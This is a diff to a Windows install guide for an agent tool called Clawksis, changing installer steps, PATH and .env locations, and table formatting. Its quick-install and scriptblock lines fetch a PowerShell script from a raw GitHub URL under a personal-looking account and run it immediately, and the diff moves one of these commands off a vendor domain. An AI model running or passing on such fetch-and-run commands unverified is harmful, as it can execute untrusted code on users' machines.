@@ -17,9 +17,7 @@ If you prefer a POSIX environment for `fork` semantics or Linux-style file watch
 
 ## Quick install
 
-[Download the Clawksis Desktop installer](https://github.com/samuelgradientai-sys/clawksis-agent/releases/latest) from our website and run it.
-
-Or, for a command-line only install, open **PowerShell** (or Windows Terminal) and run:
+Open **PowerShell** (or Windows Terminal) and run:
 
 ```powershell
 iex (irm https://raw.githubusercontent.com/samuelgradientai-sys/clawksis-agent/main/scripts/install.ps1)
@@ -30,7 +28,7 @@ No admin rights required. The installer goes to `%LOCALAPPDATA%\clawk\` and adds
 **Installer options** use a scriptblock:
 
 ```powershell
-& ([scriptblock]::Create((irm https://clawksis-agent.nousresearch.com/install.ps1))) -NonInteractive -Channel main
+& ([scriptblock]::Create((irm https://raw.githubusercontent.com/samuelgradientai-sys/clawksis-agent/main/scripts/install.ps1))) -NoVenv -SkipSetup -Branch main
 ```
 
 | Parameter | Purpose |
@@ -187,12 +185,12 @@ Clawksis's Windows stdio shim now sets `EDITOR=notepad` as a default. Notepad sh
 
 **User overrides still win** (they're checked before the setdefault):
 
-| Editor    | PowerShell command                                                                 |
-| --------- | ---------------------------------------------------------------------------------- |
-| VS Code   | `$env:EDITOR = "code --wait"`                                                      |
+| Editor | PowerShell command |
+|---|---|
+| VS Code | `$env:EDITOR = "code --wait"` |
 | Notepad++ | `$env:EDITOR = "'C:\Program Files\Notepad++\notepad++.exe' -multiInst -nosession"` |
-| Neovim    | `$env:EDITOR = "nvim"`                                                             |
-| Helix     | `$env:EDITOR = "hx"`                                                               |
+| Neovim | `$env:EDITOR = "nvim"` |
+| Helix | `$env:EDITOR = "hx"` |
 
 The `--wait` flag on VS Code is critical — without it the editor returns immediately and Clawksis gets a blank buffer back.
 
@@ -278,7 +276,7 @@ See [Browser automation](./features/browser.md) for backend selection.
 
 ### PATH after install
 
-The installer adds `%LOCALAPPDATA%\clawk\bin` to your **User PATH** via `[Environment]::SetEnvironmentVariable`. Existing terminals don't pick this up — open a new PowerShell window (or Windows Terminal tab) after installation. Close-and-reopen, don't `$env:PATH += …` by hand unless you know what you're doing.
+The installer adds `%LOCALAPPDATA%\clawk\clawksis-agent\venv\Scripts` to your **User PATH** via `[Environment]::SetEnvironmentVariable`. Existing terminals don't pick this up — open a new PowerShell window (or Windows Terminal tab) after installation. Close-and-reopen, don't `$env:PATH += …` by hand unless you know what you're doing.
 
 Verify:
 
@@ -289,7 +287,7 @@ clawk --version
 
 ### Environment variables
 
-Clawksis honors both `$env:X` (process-scope) and User environment variables (permanent, set in System Properties → Environment Variables). Setting API keys in `%USERPROFILE%\.clawksis\.env` is the normal path — same as Linux:
+Clawksis honors both `$env:X` (process-scope) and User environment variables (permanent, set in System Properties → Environment Variables). Setting API keys in `%LOCALAPPDATA%\clawk\.env` (your `CLAWK_HOME`) is the normal path — same as Linux:
 
 ```
 OPENROUTER_API_KEY=sk-or-...
